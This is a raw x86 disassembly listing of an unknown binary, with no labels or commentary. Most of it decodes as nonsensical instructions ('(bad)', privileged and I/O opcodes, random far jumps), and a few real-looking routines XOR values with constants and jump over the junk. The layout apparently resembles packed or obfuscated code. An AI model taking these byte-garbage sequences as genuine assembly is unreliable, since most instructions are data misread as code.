  40499e:	mov    ds:0x4bb96b8c,eax
  4049a3:	inc    ebp
  4049a4:	daa    
  4049a5:	icebp  
  4049a6:	mov    ds:0x77e079d9,eax
  4049ab:	jp     0x404971
  4049ad:	dec    esp
  4049ae:	ds out dx,eax
  4049b0:	sub    ch,BYTE PTR [edi]
  4049b2:	xor    ecx,DWORD PTR [edi+edx*1+0x7f3699d1]
  4049b9:	mov    bl,0x74
  4049bb:	enter  0xbd8e,0x6a
  4049bf:	es push edi
  4049c1:	pop    es
  4049c2:	cmp    eax,0xd79a8c93
  4049c7:	and    edx,edi
  4049c9:	add    bh,BYTE PTR [eax]
  4049cb:	jno    0x4049f7
  4049cd:	jp     0x4049fd
  4049cf:	imul   eax,DWORD PTR [edx+0x75c84cfd],0x1e9b354e
  4049d9:	pop    ebx
  4049da:	fwait
  4049db:	jg     0x404a3a
  4049dd:	mov    dl,0x57
  4049df:	or     eax,0xd2e5eb9a
  4049e4:	test   ecx,ecx
  4049e6:	adc    BYTE PTR [ebp+0x12ca56c0],dh
  4049ec:	stos   DWORD PTR es:[edi],eax
  4049ed:	cwde   
  4049ee:	lods   al,BYTE PTR ds:[esi]
  4049ef:	shr    BYTE PTR [ebx-0x4a568e6f],cl
  4049f5:	bound  eax,QWORD PTR [edi+0x6f]
  4049f8:	jae    0x4049da
  4049fa:	xchg   ecx,esp
  4049fc:	js     0x404a18
  4049fe:	inc    edx
  4049ff:	jge    0x404a5a
  404a01:	jno    0x404a32
  404a03:	cmp    BYTE PTR [ebx],dh
  404a05:	jecxz  0x404a16
  404a07:	ds daa 
  404a09:	jmp    0x404a09
  404a0b:	push   cs
  404a0c:	div    DWORD PTR ds:0xc9122cb0
  404a12:	sbb    al,0x46
  404a14:	sbb    esi,0xffffff85
  404a17:	aas    
  404a18:	js     0x4049bd
  404a1a:	dec    eax
  404a1b:	ins    BYTE PTR es:[edi],dx
  404a1c:	retf   0x7f49
  404a1f:	scas   al,BYTE PTR es:[edi]
  404a20:	sub    BYTE PTR [esi],dl
  404a22:	mov    ds:0xc74c2a5d,eax
  404a27:	inc    esp
  404a28:	jge    0x4049f4
  404a2a:	out    dx,al
  404a2b:	je     0x404aac
  404a2d:	scas   eax,DWORD PTR es:[edi]
  404a2e:	pop    edi
  404a2f:	lods   al,BYTE PTR ds:[esi]
  404a30:	dec    ebx
  404a31:	inc    DWORD PTR [ebp+0xc]
  404a34:	jmp    0x404377
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	push   0x247c04c9
  404a4f:	and    DWORD PTR [eax+0x70],esi
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404ac5
  404a57:	adc    al,0xaa
  404a59:	ss popa 
  404a5b:	mov    cl,0x42
  404a5d:	xchg   esp,eax
  404a5e:	jecxz  0x404a0b
  404a60:	push   eax
  404a61:	mov    ds:0x7e3a2453,eax
  404a66:	hlt    
  404a67:	mov    esi,0xecf372a9
  404a6c:	lahf   
  404a6d:	out    0x4d,eax
  404a6f:	ins    DWORD PTR es:[edi],dx
  404a70:	pop    esp
  404a71:	(bad)  
  404a72:	aad    0x26
  404a74:	pop    edx
  404a75:	js     0x404ae6
  404a77:	cmp    al,0x6f
  404a79:	aam    0xed
  404a7b:	push   esp
  404a7c:	and    DWORD PTR [ebp-0x290f5fff],ebp
  404a82:	jne    0x404a31
  404a84:	add    DWORD PTR [ecx],edi
  404a86:	mov    esi,0xd5439e0b
  404a8b:	(bad)  
  404a8c:	out    dx,eax
  404a8d:	inc    esi
  404a8e:	cwde   
  404a8f:	and    al,0x78
  404a91:	push   es
  404a92:	mov    ah,BYTE PTR [ebp+0x70cb923e]
  404a98:	outs   dx,BYTE PTR ds:[esi]
  404a99:	loopne 0x404aa6
  404a9b:	push   eax
  404a9c:	xor    DWORD PTR [esi+ebx*1-0x79],ebx
  404aa0:	xlat   BYTE PTR ds:[ebx]
  404aa1:	or     DWORD PTR [edx],edx
  404aa3:	fsubr  DWORD PTR [ecx-0x6a12d9ac]
  404aa9:	shl    DWORD PTR [eax],1
  404aab:	mov    esi,0x30279011
  404ab0:	adc    edx,DWORD PTR [ecx+eax*2-0x345c7a61]
  404ab7:	add    DWORD PTR [edi*1-0x8d67c0b],ebx
  404abe:	mov    esi,0xdc7c888a
  404ac3:	sub    eax,0x78a28799
  404ac8:	pop    ds
  404ac9:	jnp    0x404b1b
  404acb:	xchg   BYTE PTR [ebp+0x3836dec3],dl
  404ad1:	xor    DWORD PTR [ebp+0x1b],esi
  404ad4:	dec    edx
  404ad5:	xchg   edx,eax
  404ad6:	rcl    BYTE PTR [esi],cl
  404ad8:	cmp    DWORD PTR [eax],edx
  404ada:	adc    BYTE PTR [eax],cl
  404adc:	inc    edi
  404add:	mov    cl,0xbf
  404adf:	mov    ch,0xde
  404ae1:	test   eax,0xc6838d5e
  404ae6:	dec    ebp
  404ae7:	pushf  
  404ae8:	inc    edi
  404ae9:	xchg   esi,eax
  404aea:	push   ebx
  404aeb:	(bad)  
  404aec:	test   BYTE PTR [edi-0x67],0x78
  404af0:	push   ss
  404af1:	(bad)  
  404af2:	sar    BYTE PTR [ebx-0x74283010],cl
  404af8:	adc    eax,0xd57a1bc4
  404afd:	push   ss
  404afe:	push   edi
  404aff:	pop    ss
  404b00:	stc    
  404b01:	adc    BYTE PTR [esp+ebx*4-0x3edee4c7],ah
  404b08:	push   ebx
  404b09:	push   cs
  404b0a:	shr    DWORD PTR [ecx-0x5ff88a69],1
  404b10:	out    dx,al
  404b11:	mov    dl,0x57
  404b13:	inc    ebx
  404b14:	addr16 in eax,dx
  404b16:	icebp  
  404b17:	and    al,0x6e
  404b19:	inc    ebp
  404b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b1b:	pushf  
  404b1c:	mov    ch,0xfc
  404b1e:	mov    ecx,0x968e9f1e
  404b23:	jbe    0x404ab9
  404b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b26:	lea    ebp,[esi]
  404b28:	sbb    eax,0xa1da5a35
  404b2d:	sub    al,0xb3
  404b2f:	jle    0x404b06
  404b31:	jne    0x404b62
  404b33:	into   
  404b34:	pushf  
  404b35:	inc    edx
  404b36:	sub    esi,DWORD PTR [eax]
  404b38:	int3   
  404b39:	dec    edi
  404b3a:	iret   
  404b3b:	dec    edi
  404b3c:	ret    0x6ecb
  404b3f:	dec    ebx
  404b40:	adc    eax,0x700910a4
  404b45:	sub    eax,0x82daa5b4
  404b4a:	outs   dx,BYTE PTR ds:[esi]
  404b4b:	inc    ecx
  404b4c:	or     bl,cl
  404b4e:	jno    0x404b1f
  404b50:	xor    al,0x36
  404b52:	ret    0xda73
  404b55:	repz jns 0x404b84
  404b58:	je     0x404af9
  404b5a:	retf   0xafca
  404b5d:	mov    esp,0x31103086
  404b62:	cmp    al,0xf3
  404b64:	sar    BYTE PTR [ecx],0x40
  404b67:	push   ss
  404b68:	mov    ebp,0x3e8a780b
  404b6d:	push   ebx
  404b6e:	dec    edi
  404b6f:	test   al,bl
  404b71:	into   
  404b72:	idiv   BYTE PTR ds:0xc27be7dc
  404b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b79:	or     eax,0xe452a212
  404b7e:	mov    eax,DWORD PTR [ebp-0x10]
  404b81:	xor    eax,ecx
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x21011ad2
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404bc8
  404ba6:	xchg   esp,edx
  404ba8:	aad    0x54
  404baa:	lds    edi,FWORD PTR [edx+0x301ffcb6]
  404bb0:	leave  
  404bb1:	pop    ss
  404bb2:	or     dh,ah
  404bb4:	fistp  QWORD PTR [edi+edi*1+0x63]
  404bb8:	ins    BYTE PTR es:[edi],dx
  404bb9:	lods   al,BYTE PTR ds:[esi]
  404bba:	loop   0x404b60
  404bbc:	adc    al,0x69
  404bbe:	hlt    
  404bbf:	cmp    esi,eax
  404bc1:	lahf   
  404bc2:	mov    ds:0x1a110739,al
  404bc7:	mov    dh,0xa0
  404bc9:	ror    esp,0xa
  404bcc:	jge    0x404c29
  404bce:	xor    DWORD PTR [eax-0x29039c66],ecx
  404bd4:	arpl   bx,ax
  404bd6:	outs   dx,DWORD PTR ds:[esi]
  404bd7:	xchg   edi,eax
  404bd8:	int    0xdd
  404bda:	inc    esp
  404bdb:	data16 rol bh,1
  404bde:	mov    al,ds:0x4e70c726
  404be3:	sub    DWORD PTR [ecx-0x784f476],esp
  404be9:	mov    ch,dl
  404beb:	adc    ebp,DWORD PTR [ecx-0x56]
  404bee:	sbb    al,0xad
  404bf0:	add    eax,0x17762b5c
  404bf5:	xchg   esp,eax
  404bf6:	out    0x67,al
  404bf8:	fisub  WORD PTR [ecx-0x4c27e900]
  404bfe:	pop    ecx
  404bff:	ret    
  404c00:	arpl   WORD PTR [ebx+esi*2],ax
  404c03:	je     0x404c6c
  404c05:	adc    al,0x5d
  404c07:	dec    ebx
  404c08:	cdq    
  404c09:	inc    esi
  404c0a:	xchg   edi,ebp
  404c0c:	sbb    eax,0xd0f998e7
  404c11:	(bad)  
  404c13:	jns    0x404bc7
  404c15:	adc    ecx,esp
  404c17:	cmovnp esi,DWORD PTR [ebx]
  404c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c1b:	push   edi
  404c1c:	mov    ebx,DWORD PTR [ecx-0x5c500c68]
  404c22:	fistp  DWORD PTR [esi+0x70]
  404c25:	sub    eax,0x25398807
  404c2a:	pop    ebx
  404c2b:	inc    edi
  404c2c:	lea    eax,[ecx]
  404c2e:	lods   eax,DWORD PTR ds:[esi]
  404c2f:	hlt    
  404c30:	clc    
  404c31:	pop    esp
  404c32:	in     eax,0x7
  404c34:	out    0x4d,eax
  404c36:	in     al,0xff
  404c38:	sub    al,0x56
  404c3a:	cmc    
  404c3b:	pushf  
  404c3c:	jae    0x404bd0
  404c3e:	mov    al,ds:0x8a872474
  404c43:	adc    dl,BYTE PTR [edi]
  404c45:	call   0xf2da:0xc48dfda6
  404c4c:	and    dh,BYTE PTR [ebx-0xb]
  404c4f:	push   ebp
  404c50:	or     esi,eax
  404c52:	fidiv  DWORD PTR [eax]
  404c54:	jmp    0x3f3b:0x36d5a3fe
  404c5b:	es cmp bh,dh
  404c5e:	push   edx
  404c5f:	and    al,0x69
  404c61:	addr16 mov esp,0xa569d9f
  404c67:	add    al,0xa9
  404c69:	sub    BYTE PTR [ecx],bl
  404c6b:	hlt    
  404c6c:	xor    al,0x70
  404c6e:	das    
  404c6f:	aas    
  404c70:	add    esi,DWORD PTR [edi]
  404c72:	ja     0x404ca0
  404c74:	ret    0x40f9
  404c77:	mov    dl,0x7f
  404c79:	adc    al,0xd8
  404c7b:	test   DWORD PTR [eax],ecx
  404c7d:	jb     0x404c07
  404c7f:	out    0x44,al
  404c81:	es dec eax
  404c83:	push   cs
  404c84:	sub    DWORD PTR [ebx],esp
  404c86:	mov    esi,0xb7788b92
  404c8b:	xor    BYTE PTR [edx-0x23],ch
  404c8e:	popf   
  404c8f:	mov    bh,0xcd
  404c91:	cmp    al,0x95
  404c93:	mov    cl,0x64
  404c95:	inc    edx
  404c96:	mov    ebx,0x77b1d9e2
  404c9b:	iret   
  404c9c:	xor    al,0x74
  404c9e:	adc    bl,dl
  404ca0:	add    ebp,DWORD PTR [edx-0x639e98da]
  404ca6:	popa   
  404ca7:	aam    0x9a
  404ca9:	hlt    
  404caa:	and    eax,0xee302e83
  404caf:	lea    eax,[ecx+edi*4+0x5174a2ec]
  404cb6:	add    al,0x11
  404cb8:	call   0xc8f09dbd
  404cbd:	dec    esi
  404cbe:	(bad)  
  404cbf:	stos   DWORD PTR es:[edi],eax
  404cc0:	ja     0x404c59
  404cc2:	add    DWORD PTR [esi],0xffffff92
  404cc5:	cld    
  404cc6:	mov    esi,0xbe5be694
  404ccb:	pop    eax
  404ccc:	lahf   
  404ccd:	mov    DWORD PTR [ecx],eax
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432dd6,0x432704
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43437e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43437e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43437e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43437e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434382
  404d22:	push   0x43438e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432c32
  404d52:	cmp    DWORD PTR ds:0x43437e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43441d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x2f19e646
  404d98:	das    
  404d99:	dec    esi
  404d9a:	and    esp,esi
  404d9c:	das    
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404dae
  404da4:	sub    DWORD PTR [edi],edx
  404da6:	mov    ebx,0xff2fc7ab
  404dab:	sbb    edx,esi
  404dad:	xlat   BYTE PTR ds:[ebx]
  404dae:	pop    esi
  404daf:	stos   DWORD PTR es:[edi],eax
  404db0:	mov    al,BYTE PTR [ebx]
  404db2:	icebp  
  404db3:	sbb    eax,0x162392b0
  404db8:	bound  ebx,QWORD PTR [esi+edi*8-0x6]
  404dbc:	push   eax
  404dbd:	add    BYTE PTR [esi-0x76],0x90
  404dc1:	push   ebp
  404dc2:	adc    dl,dl
  404dc4:	shl    DWORD PTR [edx+0x5a],0x54
  404dc8:	xchg   ebp,eax
  404dc9:	outs   dx,BYTE PTR ds:[esi]
  404dca:	jns    0x404d69
  404dcc:	xchg   esi,eax
  404dcd:	fistp  QWORD PTR [edi-0x6508a6fc]
  404dd3:	fwait
  404dd4:	add    eax,0xabbf20e5
  404dd9:	pushf  
  404dda:	xchg   ebx,eax
  404ddb:	push   ebp
  404ddc:	pop    ds
  404ddd:	retf   
  404dde:	ja     0x404e1d
  404de0:	cmp    eax,0xec08f1e6
  404de5:	mov    ch,0xb
  404de7:	in     al,dx
  404de8:	and    bl,BYTE PTR [esp+eax*8+0x65baca5c]
  404def:	rcl    BYTE PTR [edi+0x2c],1
  404df2:	adc    eax,0x7fd2d9f8
  404df7:	jl     0x404d97
  404df9:	add    eax,0xcdd51d71
  404dfe:	mov    al,ch
  404e00:	mov    esp,0x732854c2
  404e05:	int    0x9d
  404e07:	jbe    0x404db6
  404e09:	daa    
  404e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0b:	dec    ebx
  404e0c:	jb     0x404d95
  404e0e:	sub    al,0x53
  404e10:	test   dh,bh
  404e12:	fsubp  st(3),st
  404e14:	and    ebp,DWORD PTR [ebp+0x58baf50c]
  404e1a:	nop
  404e1b:	cwde   
  404e1c:	push   ebp
  404e1d:	mov    bh,0x64
  404e1f:	jnp    0x404e3a
  404e21:	sub    dl,BYTE PTR [eax+0x5b]
  404e24:	test   DWORD PTR [ebx-0x5a],ebx
  404e27:	xchg   BYTE PTR [eax+ebp*2],cl
  404e2a:	mov    ecx,0x5bd609c3
  404e2f:	ins    BYTE PTR es:[edi],dx
  404e30:	xor    al,0x5a
  404e32:	push   esp
  404e33:	pop    ecx
  404e34:	cmp    DWORD PTR [ebx],ebp
  404e36:	cs ja  0x404e24
  404e39:	xchg   ecx,eax
  404e3a:	rcr    BYTE PTR [ebp-0x13750751],0x17
  404e41:	hlt    
  404e42:	push   edx
  404e43:	mov    WORD PTR [ebp-0x1aa45321],gs
  404e49:	sahf   
  404e4a:	mov    ds:0xd5cc4241,al
  404e4f:	(bad)  
  404e50:	push   ss
  404e51:	mov    esi,0x6f0c2491
  404e56:	xor    BYTE PTR [ebx+0x66],0xd7
  404e5a:	cs hlt 
  404e5c:	in     eax,0x7c
  404e5e:	pop    ebp
  404e5f:	dec    esi
  404e60:	and    eax,0xe4fa77cb
  404e65:	int    0xfe
  404e67:	cmp    eax,0xb0916015
  404e6c:	jp     0x404e68
  404e6e:	and    DWORD PTR [edx+0x1f4cb9d],ebp
  404e74:	test   eax,0xd46a6634
  404e79:	enter  0x7c36,0xd6
  404e7d:	test   BYTE PTR [edx-0x2c],0xa1
  404e81:	push   edi
  404e82:	sbb    DWORD PTR [ebx+0x3e],ebx
  404e85:	adc    eax,0x59335306
  404e8a:	jge    0x404ef7
  404e8c:	or     bl,BYTE PTR ds:0x558beabd
  404e92:	(bad)  
  404e93:	cmp    al,bl
  404e95:	pop    ds
  404e96:	cli    
  404e97:	aad    0xdb
  404e99:	mov    ah,BYTE PTR [ebx]
  404e9b:	mov    ebx,0xc74a2351
  404ea0:	sub    edx,ebx
  404ea2:	xor    DWORD PTR [ebx+edx*8],edi
  404ea5:	pop    esi
  404ea6:	xlat   BYTE PTR ds:[ebx]
  404ea7:	or     edx,eax
  404ea9:	clc    
  404eaa:	jl     0x404e3f
  404eac:	icebp  
  404ead:	push   edx
  404eae:	jmp    0x8d30:0x443322f9
  404eb5:	test   al,0x47
  404eb7:	adc    ebp,DWORD PTR [edx+0x33545a9e]
  404ebd:	push   edi
  404ebe:	cmp    BYTE PTR [esi+edi*8],bl
  404ec1:	test   al,0x37
  404ec3:	test   eax,0xc6606659
  404ec8:	or     DWORD PTR [edx],eax
  404eca:	push   esp
  404ecb:	popf   
  404ecc:	daa    
  404ecd:	in     al,dx
  404ece:	sbb    ebx,DWORD PTR [edi+0xa]
  404ed1:	sar    DWORD PTR [eax-0x4f],cl
  404ed4:	ja     0x404e94
  404ed6:	or     ch,dh
  404ed8:	xor    ebp,0x30
  404edb:	fmul   DWORD PTR [edi]
  404edd:	lods   eax,DWORD PTR ds:[esi]
  404ede:	lds    eax,FWORD PTR [edx+0x6]
  404ee1:	or     dl,BYTE PTR [eax-0x36d3877b]
  404ee7:	out    dx,al
  404ee8:	mov    esp,DWORD PTR [ebx-0x58]
  404eeb:	rcl    DWORD PTR [edx],cl
  404eed:	call   0x7b3a:0xeea8db68
  404ef4:	bound  eax,QWORD PTR [ecx+esi*1+0x50]
  404ef8:	jl     0x404f4e
  404efa:	pop    edi
  404efb:	ss daa 
  404efd:	sbb    BYTE PTR [edx+0xef72c8d],dh
  404f03:	ss je  0x404f7d
  404f06:	xchg   ecx,eax
  404f07:	and    DWORD PTR [eax],ebp
  404f09:	add    eax,0xfc6c86ed
  404f0e:	bound  ebp,QWORD PTR [ebp-0x74165a09]
  404f14:	mov    eax,ds:0xa17ecfb
  404f19:	imul   ebp,DWORD PTR [esi],0x1f
  404f1c:	cmc    
  404f1d:	and    DWORD PTR [edi+0x4e],0x10
  404f21:	outs   dx,DWORD PTR ds:[esi]
  404f22:	lahf   
  404f23:	fdivr  QWORD PTR [ebp+0x50a3acba]
  404f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f2b:	call   0x438a462a
  404f30:	ja     0x404f93
  404f32:	lds    edx,FWORD PTR [esi-0x2b303fca]
  404f38:	xlat   BYTE PTR ds:[ebx]
  404f39:	inc    edi
  404f3a:	pop    esi
  404f3b:	(bad)  
  404f3c:	mov    al,0x89
  404f3e:	jge    0x404f42
  404f40:	jns    0x404f08
  404f42:	stc    
  404f43:	jp     0x404f8b
  404f45:	inc    ebx
  404f46:	pop    esp
  404f47:	jmp    0x404fa1
  404f49:	add    BYTE PTR [edx],bl
  404f4b:	shl    dh,1
  404f4d:	pop    ecx
  404f4e:	dec    ebx
  404f4f:	pop    edi
  404f50:	stos   DWORD PTR es:[edi],eax
  404f51:	push   esi
  404f52:	das    
  404f53:	outs   dx,BYTE PTR ds:[esi]
  404f54:	pop    ebx
  404f55:	mov    DWORD PTR [eax],esi
  404f57:	fcomp  DWORD PTR [ebp+ebp*4-0xc]
  404f5b:	pop    edx
  404f5c:	and    BYTE PTR [ecx+eiz*2],cl
  404f5f:	call   0xdf9f:0x9e6f62ad
  404f66:	loop   0x404f11
  404f68:	iret   
  404f69:	(bad)  
  404f6a:	arpl   WORD PTR [edi],ax
  404f6c:	sub    eax,0x8ed842b2
  404f71:	lds    eax,FWORD PTR [ecx-0x5a9adc95]
  404f77:	push   eax
  404f78:	rol    DWORD PTR [edx-0x47c1c909],1
  404f7e:	jmp    0xea409134
  404f83:	(bad)  
  404f84:	adc    DWORD PTR [ecx+ebp*4-0x2c6e39ef],0x2e
  404f8c:	stos   DWORD PTR es:[edi],eax
  404f8d:	cmp    eax,0xcb17d0ee
  404f92:	lods   eax,DWORD PTR ds:[esi]
  404f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f94:	jecxz  0x404f48
  404f96:	mov    bh,0xd9
  404f98:	sbb    eax,0x263b4eec
  404f9d:	mov    ebx,0x7d18750d
  404fa2:	dec    DWORD PTR [ebx-0x4d]
  404fa5:	je     0x404f4d
  404fa7:	mov    edi,0x7ba97a25
  404fac:	stos   DWORD PTR es:[edi],eax
  404fad:	aas    
  404fae:	xor    esp,edi
  404fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fb1:	push   ebx
  404fb2:	in     eax,dx
  404fb3:	loope  0x405028
  404fb5:	or     ch,BYTE PTR [eax+ebx*1+0x3062b6]
  404fbc:	stos   DWORD PTR es:[edi],eax
  404fbd:	ret    
  404fbe:	cmp    ebx,DWORD PTR [edi+0x1d]
  404fc1:	xor    edx,ebx
  404fc3:	xor    eax,0x7b81c6b5
  404fc8:	pop    ebp
  404fc9:	scas   al,BYTE PTR es:[edi]
  404fca:	dec    ecx
  404fcb:	adc    ebx,DWORD PTR [esi-0x8a2382e]
  404fd1:	cmp    ecx,DWORD PTR [edi+0x21a29b8]
  404fd7:	sbb    edx,DWORD PTR [ecx-0x7a]
  404fda:	add    edi,ecx
  404fdc:	cmp    eax,0xa6598676
  404fe1:	or     BYTE PTR [ebp+ecx*1+0x18],bh
  404fe5:	or     al,bl
  404fe7:	dec    edi
  404fe8:	pop    es
  404fe9:	push   ss
  404fea:	repnz fidiv WORD PTR [esi-0x2a]
  404fee:	test   al,0x1e
  404ff0:	xchg   edi,eax
  404ff1:	fistp  DWORD PTR [ebx-0x75]
  404ff4:	out    dx,eax
  404ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ff6:	out    dx,al
  404ff7:	and    eax,0x544926b2
  404ffc:	ja     0x404fbd
  404ffe:	std    
  404fff:	addps  xmm0,xmm6
  405002:	iret   
  405003:	sub    edx,esp
  405005:	mov    ds:0xcd4a313e,eax
  40500a:	add    esi,ecx
  40500c:	xor    DWORD PTR ds:0x434396,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43438a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434396,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432dca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0x8b
  40505e:	mov    esp,0x2d5d4844
  405063:	jo     0x4050d5
  405065:	fnstcw WORD PTR [esi+0x70]
  405068:	jo     0x40501c
  40506a:	es dec edi
  40506c:	or     al,0xdd
  40506e:	lods   eax,DWORD PTR ds:[esi]
  40506f:	mov    ds:0xdee9b3f5,al
  405074:	dec    ebx
  405075:	mov    esi,0x76de966c
  40507a:	pop    ecx
  40507b:	test   eax,0xbcd34737
  405080:	inc    BYTE PTR [ebp-0x1]
  405083:	in     al,0xcc
  405085:	shl    DWORD PTR [edi+0x657553df],1
  40508b:	ds ja  0x40501c
  40508e:	mov    bh,0x38
  405090:	mov    bl,0xf5
  405092:	mov    ch,0xe4
  405094:	xor    DWORD PTR [ebx+esi*8+0x68],0xffffffb3
  405099:	mov    ds:0xe1c990fd,al
  40509e:	fwait
  40509f:	sub    al,0xe5
  4050a1:	iret   
  4050a2:	dec    esp
  4050a3:	jbe    0x405075
  4050a5:	sub    al,0x93
  4050a7:	push   0xa404273c
  4050ac:	adc    DWORD PTR [edi-0x36ad7c00],ecx
  4050b2:	scas   al,BYTE PTR es:[edi]
  4050b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050b4:	imul   edx,DWORD PTR [edi],0xca8169ea
  4050ba:	ds out 0xb1,al
  4050bd:	in     eax,0xe8
  4050bf:	lahf   
  4050c0:	dec    edi
  4050c1:	sbb    BYTE PTR [edi+0x2a7d6dc4],0x52
  4050c8:	fld    TBYTE PTR ds:0xca84fb23
  4050ce:	xchg   DWORD PTR [edx+esi*4-0x2a],esp
  4050d2:	stos   BYTE PTR es:[edi],al
  4050d3:	popa   
  4050d4:	rcr    bh,1
  4050d6:	and    edi,DWORD PTR [eax-0x2e]
  4050d9:	sub    BYTE PTR [ecx],al
  4050db:	sbb    edi,0x416d1fff
  4050e1:	leave  
  4050e2:	nop
  4050e3:	pop    ds
  4050e4:	pop    ss
  4050e5:	push   ds
  4050e6:	fdivr  QWORD PTR [edi]
  4050e8:	loop   0x405099
  4050ea:	pop    ebp
  4050eb:	push   0x41
  4050ed:	cli    
  4050ee:	sub    BYTE PTR [ecx+0x5c],dl
  4050f1:	js     0x405156
  4050f3:	lock es sahf 
  4050f6:	cmp    eax,0x6497fe0a
  4050fb:	push   ss
  4050fc:	das    
  4050fd:	push   cs
  4050fe:	or     DWORD PTR [esi],edi
  405100:	mov    dh,0x36
  405102:	lods   al,BYTE PTR ds:[esi]
  405103:	es (bad) 
  405105:	jnp    0x405104
  405107:	sub    dl,BYTE PTR [eax-0x24]
  40510a:	test   BYTE PTR [ecx+0x39],0xa8
  40510e:	cmp    BYTE PTR ds:0x72a56193,cl
  405114:	push   esp
  405115:	adc    bl,BYTE PTR [ecx]
  405117:	mov    ds:0x240759c3,eax
  40511c:	aam    0x77
  40511e:	and    al,0xdf
  405120:	sub    ch,BYTE PTR [ebx+0x11]
  405123:	add    DWORD PTR [ebp+0x1c2addcd],esi
  405129:	fs (bad) 
  40512c:	lahf   
  40512d:	push   es
  40512e:	jmp    0x16c4:0x75f6e664
  405135:	dec    edi
  405136:	or     edi,DWORD PTR [eax+eiz*8-0x3b8ce23]
  40513d:	pop    ebp
  40513e:	cdq    
  40513f:	leave  
  405140:	jnp    0x4050cd
  405142:	xor    DWORD PTR [edx+0x2b3742b5],edi
  405148:	pop    edi
  405149:	add    ah,dl
  40514b:	lods   al,BYTE PTR ds:[esi]
  40514c:	xor    al,0x2d
  40514e:	xchg   DWORD PTR ds:0x9f4df7c3,ecx
  405154:	pushf  
  405155:	imul   edi,eax,0x47
  405158:	mov    eax,edx
  40515a:	fild   QWORD PTR [eax-0x64e8b714]
  405160:	cmp    bl,BYTE PTR [ecx-0x7af8db36]
  405166:	mov    DWORD PTR [edx],ecx
  405168:	mov    edx,DWORD PTR [ecx+0x1c]
  40516b:	inc    ebx
  40516c:	sub    esi,DWORD PTR [ebp+0x312e594b]
  405172:	rcr    DWORD PTR [edi+ecx*1],1
  405175:	ret    
  405176:	mov    esp,0xd62af3a6
  40517b:	lock popf 
  40517d:	inc    esi
  40517e:	xchg   ecx,edi
  405180:	dec    esi
  405181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405182:	fstp   DWORD PTR [ecx-0x1b]
  405185:	push   eax
  405186:	pop    edi
  405187:	add    dl,ah
  405189:	jl     0x4051f1
  40518b:	faddp  st(0),st
  40518d:	arpl   WORD PTR ds:0xf85fe0a8,bx
  405193:	sbb    dl,BYTE PTR [ebp-0x3564cc95]
  405199:	nop
  40519a:	ds pop ds
  40519c:	pop    ebx
  40519d:	xchg   BYTE PTR [edi-0x3fd8cfac],dh
